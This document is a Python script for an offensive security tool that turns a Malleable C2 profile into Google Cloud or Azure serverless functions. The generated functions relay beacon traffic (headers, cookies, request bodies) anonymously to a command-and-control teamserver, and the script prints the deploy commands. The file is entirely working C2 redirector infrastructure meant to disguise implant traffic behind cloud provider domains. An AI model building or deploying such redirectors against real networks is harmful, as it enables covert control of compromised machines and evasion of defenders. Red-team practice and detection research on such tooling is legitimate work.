from time import sleep
import sys
import os
import argparse
from mpp import MalleableProfile

# font colors:
green = "\033[32m"
red   = '\033[31m'
blue  = '\033[34m'
white = '\033[0m' # actually the reset escape code

### Define a command line argument to load the malleable c2 profile
# Create argument parser
parser = argparse.ArgumentParser(description='Load a Malleable C2 profile')
# Add positional argument for the profile path
parser.add_argument('-p', '--profile_path', help='Path to Malleable C2 profile', required=True)
parser.add_argument('-t', '--teamserver_url', help='Teamserver URL', required=True)
parser.add_argument('-o','--output-dir', help='output directory', required=True,)

parser.add_argument('-g','--google', help='Generate Google Cloud Functions', action="store_true", required=False, default=False)

parser.add_argument('-a','--azure', help='Generate Azure Functions', action="store_true", required=False, default=False)
parser.add_argument('-s','--azure-subdomain', help='Azure subdomain', required=False)
parser.add_argument('-r','--route-prefix', help='Azure custom route prefix', required=False)



# Parse arguments
args = parser.parse_args()
profile_path = args.profile_path
teamserverURL = args.teamserver_url
azureSubdomain = args.azure_subdomain
google = args.google
azure = args.azure
output_dir = args.output_dir
route = args.route_prefix


############################################
mp = MalleableProfile(profile_path)
############################################

def get_http_get_uri():
    # Get the http_get_uri from the profile
    http_get_uri = mp.http_get.uri.value
    if ' ' in http_get_uri:
        print(f"{red}[X] ERROR: MULTIPLE URI STRINGS DETECTED IN {green}'http-get'{red} BLOCK")
        print(f"{red}[X] EDIT THE LINE {green}\"set uri {http_get_uri};\"{red} IN {green}{profile_path}{red} TO CONTAIN A SINGLE URI")
        exit() 
    else:
        return http_get_uri

def get_http_post_uri():
    # Get the http_post_uri from the profile
    http_post_uri = mp.http_post.uri.value
    print(http_post_uri)
    if ' ' in http_post_uri:
        print(f"{red}[X] ERROR: MULTIPLE URI STRINGS DETECTED IN {green}'http-post'{red} BLOCK")
        print(f"{red}[X] EDIT THE LINE {green}\"set uri {http_post_uri};\"{red} IN {green}{profile_path}{red} TO CONTAIN A SINGLE URI")
        exit() 
    else:
        return http_post_uri

# this function gets called twice, once for get and once for post
def generate_gcp_function(uri_value, output_dir, teamserver_url):

    # Create the function name
    uri = uri_value
    func_name = f"{uri_value.replace('/', '')}"
    # Create the function directory
    func_dir = os.path.join(output_dir, "gcp", func_name)
    # Create the function directory if it doesn't exist
    if not os.path.exists(func_dir):
        os.makedirs(func_dir)
    # create the requirements.txt file for the function
    with open(os.path.join(func_dir, 'requirements.txt'), 'w') as r:
        r.write(f"""
requests
        """)
    # Create the main.py file for the function
    with open(os.path.join(func_dir, 'main.py'), 'w') as f:
        f.write(f"""
from flask import make_response
import functions_framework
import requests

@functions_framework.http
def {func_name}(request):
    teamserver_url = '{teamserver_url}/' # this has to end in a '/' (slash)
    beacon_endpoint = "{uri}"          # this is the bit after the first '/'

    post_url = teamserver_url + beacon_endpoint
    header_dict = dict(request.headers)
    cookies_dict = dict(request.cookies)
    post_data = request.get_data()

    res = requests.post(
        url=post_url,
        data=post_data,
        headers=header_dict,
        cookies=cookies_dict
    )
    response = make_response(res.content)
    return response
""")

    print(f"{green}[+]{white} deploy '{func_name}' with: {green}`gcloud functions deploy {func_name} --runtime python39 --trigger-http --allow-unauthenticated`{white}")

#####################################3
# this function gets called once and generated http get and post cloud functions
def generate_azure_functions(directory, teamserver_url, get_uri = get_http_get_uri(), post_uri = get_http_post_uri(), route_prefix = None, azure_subdomain = azureSubdomain):

    # create the azure directory
    if not os.path.exists(directory):
        main_dir = os.path.join(directory, "azure")
        os.makedirs(main_dir)
    else:
        main_dir = os.path.join(directory, "azure")
        os.makedirs(main_dir)


    # make the host.json, proxies.json, and requirements.txt files in parent directory
    host_json_default_route_prefix = """{
        "version": "2.0"
    }"""

    host_json_custom_route_prefix = f"""{{
        "version": "2.0",
        "extensions": {{
            "http": {{
                "routePrefix": "{route_prefix}"
            }}
        }},
        "extensionsBundle": {{
            "id": "Microsoft.Azure.Functions.ExtensionBundle",
            "version": "[1.*, 2.0.0)"
        }}
    }}"""

    proxies_json = """{
        "$schema": "http://json.schemastore.org/proxies",
        "proxies": {}
    }"""

    requirements_txt = """azure-functions
    # Required for the Azure Functions runtime
    azure-functions-worker"""

    with open(os.path.join(directory,"azure", "proxies.json"), "w") as f:
        f.write(proxies_json)
    with open(os.path.join(directory,"azure", "requirements.txt"), "w") as f:
        f.write(requirements_txt)

    # write the host.json file with the correct route prefix, create route prefix variable
    if route_prefix:
        host_json = host_json_custom_route_prefix
        get_endpoint =  route_prefix + "/" + get_uri
        post_endpoint =  route_prefix + "/"+ post_uri
    else:
        host_json = host_json_default_route_prefix
        get_endpoint =  "api/" + get_uri
        post_endpoint =  "api/" + post_uri

    with open(os.path.join(directory,"azure", "host.json"), "w") as f:
        f.write(host_json)

    # make the get_endpoint and post_endpoint variables
################################################################

    # make the __init__.py files for the functions 
    get_init = f"""
import logging
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    #incoming_request = urlparse(req.url)
    #dict(req.headers).items()
    header_dict = {{}}
    get_url = '{teamserver_url + "/" + get_endpoint}'
    for key, value in dict(req.headers).items():
        header_dict.update({{key : value}})

    request = urllib.request.Request(get_url, headers=header_dict)
    with urllib.request.urlopen(request) as response:
        html = response.read()
    return func.HttpResponse(html)
    """
    ##########################################################

    post_init = f"""
import logging
import ssl
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    #incoming_request = urlparse(req.url)
    #dict(req.headers).items()
    header_dict = {{}}
    get_url = '{teamserver_url + "/" + post_endpoint}'
    for key, value in dict(req.headers).items():
        header_dict.update({{key : value}})
    #ssl._create_default_https_context = ssl._create_unverified_context
    post_data = req.get_body()
    request = urllib.request.Request(get_url, data=post_data, headers=header_dict)
    with urllib.request.urlopen(request) as response:
        html = response.read()
    return func.HttpResponse(html)
    """
    func_json = """
{
  "scriptFile": "__init__.py",
  "bindings": [
    {
      "authLevel": "anonymous",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": [
        "get",
        "post"
      ]
    },
    {
      "type": "http",
      "direction": "out",
      "name": "$return"
    }
  ]
}
    """

    sample_dat = """
{
    "name": "Azure"
}
    """
    # make the directories for the functions
    for func_dir in ["get", "post"]:
        func_dir_path = os.path.join(main_dir, func_dir)
        os.makedirs(func_dir_path)

    get_path = os.path.join(main_dir, "get")  
    post_path = os.path.join(main_dir, "post") 

    # create the __init__.py files
    init_file_path = os.path.join(get_path, "__init__.py")
    with open(init_file_path, "w") as f:
        f.write(get_init)

    init_file_path = os.path.join(post_path, "__init__.py")
    with open(init_file_path, "w") as f:
        f.write(post_init)

    # create the function.json file
    function_file_path = os.path.join(get_path, "function.json")
    with open(function_file_path, "w") as f:
        f.write(func_json)

    function_file_path = os.path.join(post_path, "function.json")
    with open(function_file_path, "w") as f:
        f.write(func_json)

    # create the sample.dat file
    sample_file_path = os.path.join(get_path, "sample.dat")
    with open(sample_file_path, "w") as f:
        f.write(sample_dat)

    sample_file_path = os.path.join(post_path, "sample.dat")
    with open(sample_file_path, "w") as f:
        f.write(sample_dat)
    print(f"{green}[+]{white} azure Function created at {directory}!")
################################################################################

def print_banner():
    sleep(0.1)
    print(f"""{white}
       d8888          888            8888888888                888      888          
      d88888          888            888                       888      888          
     d88P888          888            888                       888      888          
    d88P 888 888  888 888888 {red}.d  b.{white}  8888888 888  888 88888b.  888  888 888888       
   d88P  888 888  888 888   {red}d88  88b{white} 888     888  888 888 "88b 888 .88P 888          
  d88P   888 888  888 888            888     888  888 888  888 888888K  888          
 d8888888888 Y88b 888 Y88b. {red}Y88  88P{white} 888     Y88b 888 888  888 888 "88b Y88b.        
d88P     888  "Y88888  "Y888 {red}"Y  P"{white}  888      "Y88888 888  888 888  888  "Y888   
""")
    sleep(0.1)
    print(f"""\t\tmalleable c2 => serverless cloud functions
    """)
    sleep(0.1)
    print(f"{red}from your friends at...")
    sleep(0.1)
    print(f""" 
{blue}     ,---. .---.  ,---.  _______.-.   .-..-. .-. .---.  ,---.  _______ .-. .-. 
{blue}     | .-'/ .-. ) | .-.\|__   __|\ \_/ )/|  \| |/ .-. ) | .-.\|__   __|| | | | 
{blue}     | `-.| | |(_)| `-'/  )| |    \   (_)|   | || | |(_)| `-'/  )| |   | `-' | 
{blue}     | .-'| | | | |   (  (_) |     ) (   | |\  || | | | |   (  (_) |   | .-. | 
{blue}     | |  \ `-' / | |\ \   | |     | |   | | |)|\ `-' / | |\ \   | |   | | |)| 
{blue}     )\|   )---'  |_| \)\  `-'    /(_|   /(  (_) )---'  |_| \)\  `-'   /(  (_) 
{blue}    (__)  (_)         (__)       (__)   (__)    (_)         (__)      (__)     
{blue}    ======================================================= Security ========={blue}""")
    sleep(0.1)
    print(f"""
\t|| = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = || 
\t||  \t\t       written by {red}adam rose {blue}                     || 
\t|| = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = || 
\t||  https://{red}github{blue}.com/{red}a-3-r{blue} | https://{red}twitter{blue}.com/{red}aaaa3333rrrr{blue}  ||
\t|| = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = || 
\t||\t\t    https://{red}fortynorthsecurity{blue}.com               ||    
\t|| \t\thttps://github.com/{red}fortynorthsecurity{blue}            || 
\t|| = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = || 
   {white} 
    """)
################################################################################

def runner():
    print_banner()
    try:
        if not google and not azure:
            print(f"{red}[!] {white}no cloud provider specified")
            print(f"{red}[!] {white} -g/--google OR -a/--azure are required, exiting...")
            sys.exit(1)

        if google:
            print(f"{blue}[+] {white}generating gcp functions...")
            generate_gcp_function(get_http_get_uri(), output_dir, teamserverURL)
            generate_gcp_function(get_http_post_uri(), output_dir, teamserverURL)
        else:
            print(f"{blue}[+] {white}-g/--google flag omitted, skipping google cloud function generation...")

    # def generate_azure_functions(directory, teamserver_url, get_uri = get_http_get_uri(), post_uri = get_http_post_uri(), route_prefix = None, azure_subdomain = azureSubdomain):
        if azure:
            print(f"{blue}[+] {white}generating azure functions...")
            generate_azure_functions(directory=output_dir, teamserver_url=teamserverURL, route_prefix=route, azure_subdomain=azureSubdomain)
        else:
            print(f"{blue}[+] {white}-a/--azure flag omitted, skipping azure function generation...")
        print(f"{green}[+] {white}done!{white}")
    except Exception as e:
        print(f"{red}[!] {white}something went wrong, exiting...")
        print(e)
        sys.exit(2) 


# Call the runner
runner()

